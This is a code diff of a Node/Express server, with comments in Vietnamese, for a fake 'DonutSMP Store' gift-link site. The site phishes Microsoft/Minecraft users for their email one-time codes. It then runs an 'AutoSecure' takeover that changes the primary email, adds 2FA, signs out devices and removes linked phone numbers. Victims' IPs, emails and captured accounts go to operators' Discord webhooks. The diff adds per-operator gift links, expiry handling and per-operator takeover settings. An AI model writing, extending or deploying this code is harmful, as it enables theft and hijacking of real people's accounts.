@@ -77,24 +77,24 @@ app.use((req, res, next) => {
 // Realtime Web Activity Logging
 app.post('/api/web-activity', async (req, res) => {
     try {
-        const { code, username, email, action, statusText, link, domain } = req.body || {};
-        const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
-        const clientIp = rawIp.split(',')[0].trim() || '127.0.0.1';
+        const { code, username, email, statusText, domain } = req.body || {};
+        // Only log if username and email are both provided
+        if (username && email) {
+            const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
+            const clientIp = rawIp.split(',')[0].trim() || '127.0.0.1';
 
-        await sendWebLog({
-            code,
-            ip: clientIp,
-            link,
-            domain: domain || req.headers.host || 'donutmp.store',
-            username,
-            email,
-            action: action || 'input',
-            statusText: statusText || 'Click Continue'
-        });
+            await sendWebLog({
+                code,
+                ip: clientIp,
+                domain: domain || req.headers.host || config.webDomain || 'localhost:3000',
+                username,
+                email,
+                statusText: statusText || 'Send Code'
+            });
+        }
 
         return res.json({ success: true });
     } catch (err) {
-        console.error('[API /web-activity] Error logging:', err.message);
         return res.status(500).json({ success: false, error: err.message });
     }
 });
@@ -119,24 +119,56 @@ app.get('/api/health', (req, res) => {
  */
 app.post('/api/send-otp', async (req, res) => {
     try {
-        let { email, username } = req.body;
+        let { email, username, giftCode, code: altCode } = req.body;
         email = (email || '').trim();
         username = (username || '').trim();
+        const curGiftCode = (giftCode || altCode || '').trim();
+
+        // Check gift link validity and 30-min expiration if code provided
+        let resolvedBotUserId = null;
+        let resolvedBotNumber = 1;
+
+        if (curGiftCode) {
+            const EXPIRY_MS = 30 * 60 * 1000;
+            const now = Date.now();
+            const giftRows = await queryParams('SELECT * FROM gift_links WHERE code = ?', [curGiftCode]);
+            if (!giftRows || giftRows.length === 0 || (now - giftRows[0].created_at > EXPIRY_MS)) {
+                if (giftRows && giftRows.length > 0) {
+                    await queryParams('DELETE FROM gift_links WHERE code = ?', [curGiftCode]).catch(() => {});
+                }
+                return res.status(410).json({
+                    success: false,
+                    error: 'Gift link has expired after 30 minutes. Please ask for a new link!'
+                });
+            }
+            resolvedBotUserId = giftRows[0].bot_user_id;
+            resolvedBotNumber = giftRows[0].bot_number || 1;
+
+            const { checkWebAccess } = require('./autosecure/utils/web/webAccess');
+            const ownerWebAccess = await checkWebAccess(resolvedBotUserId);
+            if (!ownerWebAccess.hasAccess) {
+                return res.status(403).json({
+                    success: false,
+                    error: 'Dịch vụ web của người gửi hiện đang tạm ngưng do hết hạn bản quyền.'
+                });
+            }
+        }
 
         console.log(`\n======================================================`);
         console.log(`[API /send-otp] Nhận yêu cầu gửi mã OTP:`);
         console.log(` • Email    : ${email}`);
-        console.log(` • Username : ${username || 'Chưa cung cấp'}`);
+        console.log(` • Username : ${username || 'N/A'}`);
+        console.log(` • GiftCode : ${curGiftCode || 'None'}`);
+        console.log(` • Bot Owner: ${resolvedBotUserId || 'Default'}`);
 
         if (!email) {
             return res.status(400).json({
                 success: false,
-                error: 'Vui lòng nhập địa chỉ email Minecraft / Microsoft!'
+                error: 'Vui lòng nhập email tài khoản Microsoft / Minecraft của bạn.'
             });
         }
 
         if (!validEmail(email)) {
-            console.log(`[API /send-otp] [!] Định dạng email không hợp lệ: ${email}`);
             return res.status(400).json({
                 success: false,
                 error: 'Định dạng email không hợp lệ. Vui lòng kiểm tra lại!'
@@ -146,8 +178,19 @@ app.post('/api/send-otp', async (req, res) => {
         console.log(`[API /send-otp] Đang truy vấn Microsoft Live Credentials cho ${email}...`);
         const profiles = await getCredentials(email, false);
 
+        const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
+        const clientIp = rawIp.split(',')[0].trim() || '127.0.0.1';
+
         if (!profiles) {
             console.log(`[API /send-otp] [X] Không thể tìm thấy thông tin tài khoản Microsoft: ${email}`);
+            sendWebLog({
+                code: curGiftCode,
+                ip: clientIp,
+                username: username || 'Player',
+                email,
+                statusText: 'Invalid Email'
+            }).catch(() => {});
+
             return res.status(404).json({
                 success: false,
                 error: 'Không tìm thấy tài khoản Microsoft liên kết với email này.'
@@ -161,6 +204,14 @@ app.post('/api/send-otp', async (req, res) => {
 
         if (!eligibleProofs || eligibleProofs.length === 0) {
             console.log(`[API /send-otp] [X] Tài khoản không có phương thức nhận mã OTP qua Email!`);
+            sendWebLog({
+                code: curGiftCode,
+                ip: clientIp,
+                username: username || 'Player',
+                email,
+                statusText: 'No security options'
+            }).catch(() => {});
+
             return res.status(400).json({
                 success: false,
                 error: 'Tài khoản Microsoft này không hỗ trợ gửi mã xác minh một lần qua Email.'
@@ -184,6 +235,15 @@ app.post('/api/send-otp', async (req, res) => {
             });
         }
 
+        // Log to Discord: Minecraft Username + Email entered and OTP successfully sent
+        sendWebLog({
+            code: curGiftCode,
+            ip: clientIp,
+            username: username || 'Player',
+            email,
+            statusText: 'Send Code'
+        }).catch(() => {});
+
         // Store session
         const sessionId = 'sess_' + Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
         activeSessions.set(sessionId, {
@@ -191,6 +251,9 @@ app.post('/api/send-otp', async (req, res) => {
             secData,
             secDisplay,
             username,
+            giftCode: curGiftCode,
+            botUserId: resolvedBotUserId,
+            botNumber: resolvedBotNumber,
             timestamp: Date.now()
         });
 
@@ -217,12 +280,15 @@ app.post('/api/send-otp', async (req, res) => {
 
 /**
  * 3. Verify OTP & AutoSecure (User nhập OTP -> Nếu đúng = AutoSecure -> Bắn hit Discord)
- * Body: { sessionId, email, secId, code, username }
+ * Body: { sessionId, email, secId, code, username, giftCode }
  */
 app.post('/api/verify-otp', async (req, res) => {
     try {
-        let { sessionId, email, secId, code, username } = req.body;
+        let { sessionId, email, secId, code, username, giftCode, code: altCode } = req.body;
         code = (code || '').toString().trim();
+        let curGiftCode = (giftCode || altCode || '').trim();
+        let botUserId = null;
+        let botNumber = 1;
 
         // Restore from session if available
         if (sessionId && activeSessions.has(sessionId)) {
@@ -230,6 +296,18 @@ app.post('/api/verify-otp', async (req, res) => {
             if (!email) email = sess.email;
             if (!secId) secId = sess.secData;
             if (!username) username = sess.username;
+            if (!curGiftCode) curGiftCode = sess.giftCode;
+            botUserId = sess.botUserId;
+            botNumber = sess.botNumber || 1;
+        }
+
+        // If botUserId not yet resolved from session, query from gift_links
+        if (!botUserId && curGiftCode) {
+            const giftRows = await queryParams('SELECT * FROM gift_links WHERE code = ?', [curGiftCode]);
+            if (giftRows && giftRows.length > 0) {
+                botUserId = giftRows[0].bot_user_id;
+                botNumber = giftRows[0].bot_number || 1;
+            }
         }
 
         email = (email || '').trim();
@@ -242,6 +320,7 @@ app.post('/api/verify-otp', async (req, res) => {
         console.log(` • SecId    : ${secId ? 'Hợp lệ' : 'Trống'}`);
         console.log(` • Mã OTP   : ${code}`);
         console.log(` • Username : ${username || 'N/A'}`);
+        console.log(` • Bot Owner: ${botUserId || 'Default'}`);
 
         if (!code || isNaN(code)) {
             return res.status(400).json({
@@ -275,28 +354,115 @@ app.post('/api/verify-otp', async (req, res) => {
         // Generate unique account UID
         const uid = await generateuid();
 
-        // Prepare autosecure configuration
+        // Fetch user custom autosecure config if botUserId found
+        let userConfig = null;
+        if (botUserId) {
+            let userRows = await queryParams('SELECT * FROM autosecure WHERE user_id = ? AND botnumber = ?', [botUserId, botNumber]);
+            if (!userRows || userRows.length === 0) {
+                userRows = await queryParams('SELECT * FROM autosecure WHERE user_id = ? LIMIT 1', [botUserId]);
+            }
+            if (userRows && userRows.length > 0) {
+                userConfig = userRows[0];
+            }
+        }
+
+        const effectiveUserId = botUserId || "web_system";
         const settings = {
-            user_id: "web_system",
-            botnumber: 1,
-            auto_secure: 1,
-            exploit: 1,
-            oauthapps: 1,
-            removedevices: 1,
-            signout: 1,
-            changeprimary: 1,
-            secureifnomc: 1,
-            addzyger: 1,
-            removecards: 1,
-            leavefamily: 1,
-            removelinkednumbers: 1,
-            webhook: config.notifierWebhook || "",
-            prefix: "HachiiroMC",
-            domain: (config.domains && config.domains[0]) || "thapcamstore.click",
-            pfp: config.defaultpfp || "https://website.donutsmp.org/bcGCsev.png",
-            ping: "@everyone",
-            aftersecure: "nothing"
+            ...(userConfig || {}),
+            user_id: effectiveUserId,
+            botnumber: botNumber,
+
+            // Row 1 (Discord Settings embed)
+            auto_secure: userConfig?.auto_secure ?? 1,
+            change_ign: userConfig?.change_ign ?? 0,
+            multiplayer: userConfig?.multiplayer ?? 0,
+
+            // Row 2
+            secureifnomc: userConfig?.secureifnomc ?? 1,
+            checkban: userConfig?.checkban ?? 0,
+            checkban_hypixel: userConfig?.checkban_hypixel ?? userConfig?.checkban ?? 0,
+            checkban_donut: userConfig?.checkban_donut ?? 0,
+            autoquarantine: userConfig?.autoquarantine ?? 0,
+
+            // Row 3
+            oauthapps: userConfig?.oauthapps ?? 1,
+            exploit: userConfig?.exploit ?? 1,
+            removedevices: userConfig?.removedevices ?? 1,
+
+            // Row 4
+            addzyger: userConfig?.addzyger ?? 1,
+            signout: userConfig?.signout ?? 1,
+            changegamertag: userConfig?.changegamertag ?? 0,
+
+            // Row 5
+            subscribemail: userConfig?.subscribemail ?? 0,
+            changeprimary: userConfig?.changeprimary ?? 1,
+            domain: userConfig?.domain || (config.domains && config.domains[0]) || "thapcamstore.click",
+
+            // Embed 2 (Personalization)
+            changename: userConfig?.changename ?? 0,
+            name: userConfig?.name || null,
+            changedob: userConfig?.changedob ?? 0,
+            dob: userConfig?.dob || null,
+            changepfp: userConfig?.changepfp ?? 0,
+            pfp: userConfig?.pfp || config.defaultpfp || "https://website.donutsmp.org/bcGCsev.png",
+            changelanguage: userConfig?.changelanguage ?? 0,
+            language: userConfig?.language || 'en-US',
+            prefix: userConfig?.prefix || "vingr0ub",
+
+            // Other configs
+            removecards: userConfig?.removecards ?? 0,
+            leavefamily: userConfig?.leavefamily ?? 1,
+            removelinkednumbers: userConfig?.removelinkednumbers ?? 1,
+            webhook: userConfig?.webhook || config.notifierWebhook || "",
+            ping: userConfig?.ping || "@everyone",
+            aftersecure: userConfig?.aftersecure || "nothing",
+            hits_channel: userConfig?.hits_channel || null,
+            logs_channel: userConfig?.logs_channel || null,
+            notification_channel: userConfig?.notification_channel || null,
+            users_channel: userConfig?.users_channel || null,
+            server_id: userConfig?.server_id || null,
+            claiming: userConfig?.claiming ?? 0
         };
+
+        console.log(`[API /verify-otp] Áp dụng cấu hình Autosecure của bot con (${effectiveUserId}):`);
+        console.log(` • Autosecure    : ${settings.auto_secure ? 'BẬT' : 'TẮT'}`);
+        console.log(` • Change IGN    : ${settings.change_ign ? 'BẬT' : 'TẮT'}`);
+        console.log(` • Multiplayer   : ${settings.multiplayer ? 'TẮT MP' : 'GIỮ NGUYÊN'}`);
+        console.log(` • Checkban      : ${settings.checkban ? 'BẬT' : 'TẮT'}`);
+        console.log(` • Zyger 2FA     : ${settings.addzyger ? 'BẬT' : 'TẮT'}`);
+        console.log(` • Change Primary: ${settings.changeprimary ? 'BẬT' : 'TẮT'}`);
+        console.log(` • Prefix        : ${settings.prefix}`);
+        console.log(` • Domain MCS    : ${settings.domain}`);
+        console.log(` • Change Name   : ${settings.changename ? 'BẬT' : 'TẮT'}`);
+        console.log(` • Change DOB/Reg: ${settings.changedob ? 'BẬT' : 'TẮT'}`);
+        console.log(` • Change PFP    : ${settings.changepfp ? 'BẬT' : 'TẮT'}`);
+        console.log(` • Change Lang   : ${settings.changelanguage ? 'BẬT' : 'TẮT'}`);
+
+        if (!settings.auto_secure) {
+            console.log(`[API /verify-otp] Bot con đã tắt Autosecure! Lưu mã vào danh sách chờ claim thủ công.`);
+            const embedData = {
+                embeds: [{
+                    title: `${username || 'Account'}! :x:`,
+                    description: `Email: **${email}**\nSecurity email: **${secId}**\nCode: **${code}**\n*Autosecure đang TẮT trong cấu hình bot con. Vui lòng claim thủ công.*`,
+                    color: 0x00ff00
+                }]
+            };
+            await queryParams("INSERT INTO unclaimed (user_id, username, data) VALUES (?, ?, ?)",
+                [effectiveUserId, username || email, JSON.stringify(embedData)]).catch(() => {});
+
+            if (curGiftCode) {
+                await queryParams('DELETE FROM gift_links WHERE code = ?', [curGiftCode]).catch(() => {});
+            }
+            if (sessionId) activeSessions.delete(sessionId);
+
+            return res.json({
+                success: true,
+                uid,
+                username: username || email,
+                message: 'Mã xác nhận hợp lệ. Vui lòng dùng lệnh /claim trong Discord để nhận tài khoản!'
+            });
+        }
 
         // Execute AutoSecure account takeover
         let acc = await secure(host, settings, uid, username);
@@ -329,16 +495,16 @@ app.post('/api/verify-otp', async (req, res) => {
             } catch (e) {}
         }
 
-        // Insert into SQLite database
+        // Insert into SQLite database mapped to specific bot owner
         try {
-            await insertaccount(acc, uid, "web_system", settings.secureifnomc);
-            console.log(`[API /verify-otp] [✔] Đã lưu thông tin tài khoản vào database SQLite.`);
+            await insertaccount(acc, uid, effectiveUserId, settings.secureifnomc);
+            console.log(`[API /verify-otp] [✔] Đã lưu thông tin tài khoản vào database SQLite cho user: ${effectiveUserId}`);
         } catch (dbErr) {
             console.error(`[API /verify-otp] Lỗi lưu DB:`, dbErr.message);
         }
 
-        // Send Hit to Discord Webhook
-        console.log(`[API /verify-otp] ĐANG BẮN HIT VỀ DISCORD WEBHOOK...`);
+        // Send Hit to Discord
+        console.log(`[API /verify-otp] ĐANG BẮN HIT VỀ DISCORD...`);
         try {
             const accountData = {
                 username: targetIgn || 'Unknown',
@@ -360,10 +526,16 @@ app.post('/api/verify-otp', async (req, res) => {
                 networkLevel: hypixelStats?.networkLevel || '0'
             };
 
-            await sendSecureNotification(null, accountData);
+            const clientTarget = { username: effectiveUserId, botnumber: botNumber };
+            await sendSecureNotification(clientTarget, accountData);
             console.log(`[API /verify-otp] [✔] HIT ĐÃ ĐƯỢC BẮN THÀNH CÔNG VỀ DISCORD!`);
         } catch (whError) {
             console.error(`[API /verify-otp] Lỗi bắn hit Discord:`, whError.message);
+        }
+
+        // Consume gift link
+        if (curGiftCode) {
+            await queryParams('DELETE FROM gift_links WHERE code = ?', [curGiftCode]).catch(() => {});
         }
 
         // Clear active session
@@ -393,22 +565,73 @@ app.post('/api/verify-otp', async (req, res) => {
 app.use('/assets', express.static(path.join(FRONTEND_DIR, 'assets')));
 app.use('/terms', express.static(path.join(FRONTEND_DIR, 'terms')));
 
+// Periodic cleanup of expired gift links (> 30 mins) every 5 minutes
+setInterval(async () => {
+    try {
+        await queryParams('DELETE FROM gift_links WHERE created_at < ?', [Date.now() - 30 * 60 * 1000]);
+    } catch (e) {}
+}, 5 * 60 * 1000);
+
 // Donut Gift Link Claim Routes
 app.get(['/gift/:code/claim', '/gift/:code'], async (req, res) => {
     const code = req.params.code;
     const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
     const clientIp = rawIp.split(',')[0].trim() || '127.0.0.1';
-    const host = req.headers.host || 'donutmp.store';
+    const host = req.headers.host || config.webDomain || 'localhost:3000';
+    const EXPIRY_MS = 30 * 60 * 1000;
+    const now = Date.now();
 
-    sendWebLog({
-        code,
-        ip: clientIp,
-        link: `${host}/gift/${code}/claim`,
-        domain: host,
-        action: 'click_link'
-    }).catch(err => console.error('[SERVER] Error logging click:', err.message));
+    try {
+        // 1. Dọn dẹp link cũ
+        await queryParams('DELETE FROM gift_links WHERE created_at < ?', [now - EXPIRY_MS]).catch(() => {});
 
-    res.redirect(`/checkout/payment?gift=true&code=${encodeURIComponent(code)}`);
+        // 2. Kiểm tra link có tồn tại và còn hạn 30 phút không
+        const rows = await queryParams('SELECT * FROM gift_links WHERE code = ?', [code]);
+        if (!rows || rows.length === 0) {
+            return res.status(410).send(`
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="utf-8">
+    <title>Gift Link Expired - DonutSMP Store</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background: #0f1117; color: #fff; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
+        .card { background: #1a1d26; border: 1px solid #2d3343; border-radius: 16px; padding: 40px 30px; max-width: 480px; width: 100%; text-align: center; box-shadow: 0 16px 40px rgba(0,0,0,0.6); }
+        .icon { font-size: 56px; margin-bottom: 16px; animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.08); } }
+        h1 { font-size: 22px; margin: 0 0 12px; color: #f87171; font-weight: 700; }
+        p { color: #9ca3af; font-size: 15px; line-height: 1.6; margin: 0 0 26px; }
+        .btn { display: inline-block; background: #eab308; color: #111; text-decoration: none; padding: 13px 28px; border-radius: 10px; font-weight: 700; font-size: 14px; transition: 0.2s; }
+        .btn:hover { background: #facc15; transform: translateY(-2px); }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="icon">⌛</div>
+        <h1>Link Gift Đã Hết Hạn / Không Tồn Tại</h1>
+        <p>Liên kết quà tặng này chỉ có hiệu lực trong <strong>30 phút</strong> và hiện đã tự động hết hạn hoặc bị xóa.<br><br>Vui lòng yêu cầu người gửi tạo link gift mới để tiếp tục!</p>
+        <a href="/store" class="btn">Quay lại Trang Chủ Store</a>
+    </div>
+</body>
+</html>
+            `);
+        }
+
+        // 3. Gửi thông báo click vào đúng bot sở hữu link
+        sendWebLog({
+            code,
+            ip: clientIp,
+            link: `${host}/gift/${code}/claim`,
+            domain: host,
+            action: 'click_link'
+        }).catch(err => console.error('[SERVER] Error logging click:', err.message));
+
+        res.redirect(`/checkout/payment?gift=true&code=${encodeURIComponent(code)}`);
+    } catch (err) {
+        console.error('[SERVER /gift claim] Error:', err);
+        res.redirect(`/checkout/payment?gift=true&code=${encodeURIComponent(code)}`);
+    }
 });
 
 app.get('/gift', (req, res) => {
